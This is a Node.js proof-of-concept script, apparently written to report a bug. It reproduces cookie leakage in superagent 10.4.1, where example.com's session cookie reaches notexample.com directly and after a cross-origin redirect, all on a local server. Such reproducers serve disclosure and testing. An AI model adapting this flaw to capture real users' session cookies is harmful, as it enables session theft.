// superagent 10.4.1: an agent sends example.com's cookie to notexample.com,
// both directly and after a cross-origin 302. Hostnames are mapped to
// 127.0.0.1 with .connect(), so no DNS or hosts-file changes are needed.
// Run: npm install && node poc-superagent.js
const http = require('http');
const superagent = require('superagent');

const server = http.createServer((req, res) => {
  const port = server.address().port;
  if (req.url === '/login') {
    res.setHeader('Set-Cookie', 'session=abc123; Domain=example.com; Path=/');
  } else if (req.url === '/go') {
    res.statusCode = 302;
    res.setHeader('Location', `http://notexample.com:${port}/landing`);
  } else {
    console.log(`${req.headers.host} ${req.url} -> Cookie: ${req.headers.cookie || '(none)'}`);
  }
  res.end('ok');
});

server.listen(0, '127.0.0.1', async () => {
  const port = server.address().port;
  const get = (agent, host, path) =>
    agent.get(`http://${host}:${port}${path}`).connect({ '*': '127.0.0.1' });
  const agent = superagent.agent();
  await get(agent, 'example.com', '/login');
  await get(agent, 'notexample.com', '/direct'); // direct request
  await get(agent, 'example.com', '/go');        // cross-origin 302
  server.close();
});
